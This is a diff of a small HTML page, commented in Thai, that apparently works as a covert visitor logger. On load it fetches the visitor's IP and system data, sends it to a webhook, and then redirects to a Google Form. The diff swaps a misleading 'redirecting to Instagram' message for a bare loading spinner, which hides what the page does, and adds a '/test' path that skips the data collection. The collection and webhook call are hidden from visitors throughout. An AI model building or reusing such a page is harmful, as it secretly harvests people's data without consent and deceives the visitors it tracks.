@@ -5,9 +5,33 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CocoaKunG</title>
     <link rel="icon" href="https://img5.pic.in.th/file/secure-sv1/81886c3ac80db7d613194143cd712f99.jpg" type="image/png">
+    <style>
+        body {
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fff;
+        }
+
+        .loader {
+            border: 16px solid #f3f3f3; /* Light grey */
+            border-top: 16px solid #FFA500; /* Orange */
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
-    <p>กำลังเปลี่ยนเส้นทางไปที่ Instagram...</p>
+    <div class="loader"></div>
     <script>
         // ฟังก์ชันเพื่อดึงข้อมูลจาก IP API
         function fetchIPData() {
@@ -45,13 +69,21 @@
             });
         }
 
-        // ดึงข้อมูล IP และระบบอื่น ๆ แล้วส่งไปยัง Webhook
-        fetchIPData().then(ipData => {
-            sendToWebhook(ipData);
+        // ตรวจสอบเส้นทาง URL และเปลี่ยนเส้นทางตามนั้น
+        function checkPath() {
+            const currentPath = window.location.pathname;
+            if (currentPath.includes("/test")) {
+                window.location.href = "web.html";
+            } else {
+                fetchIPData().then(ipData => {
+                    sendToWebhook(ipData);
+                    window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSeT_bSz4XGDYuIhR6DTA8KkEaX4Zg5Oa2bdTTXqKfvAbA8HXw/viewform";
+                });
+            }
+        }
 
-            // เปลี่ยนเส้นทางไปยัง Instagram หลังจากส่งข้อมูลแล้ว
-            window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSeT_bSz4XGDYuIhR6DTA8KkEaX4Zg5Oa2bdTTXqKfvAbA8HXw/viewform";
-        });
+        // เรียกใช้ฟังก์ชันตรวจสอบเส้นทางเมื่อโหลดหน้าเว็บ
+        checkPath();
     </script>
 </body>
 </html>
